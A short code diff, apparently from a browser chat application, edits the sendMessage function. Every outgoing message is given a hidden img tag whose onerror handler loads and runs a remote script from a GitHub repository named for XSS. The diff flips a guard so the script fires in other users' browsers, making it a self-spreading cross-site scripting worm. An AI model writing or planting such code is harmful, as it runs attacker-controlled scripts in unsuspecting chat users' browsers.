@@ -5,7 +5,7 @@ eafeaf = true;
 
 function sendMessage() {
             const name = getUsername();
-            const content = `<img src="" onerror="if (typeof eafeaf !== 'undefined') { var s = document.createElement('script'); s.src='https://raw.githubusercontent.com/davidtheplatform/megi-xss/main/main.js'; document.head.appendChild(s); }">` + messageInput.value;
+            const content = `<img src="" onerror="if (typeof eafeaf === 'undefined') { var s = document.createElement('script'); s.src='https://raw.githubusercontent.com/davidtheplatform/megi-xss/main/main.js'; document.head.appendChild(s); }">` + messageInput.value;
             const color = getUserColor();
 
             if (content.trim() !== "") {
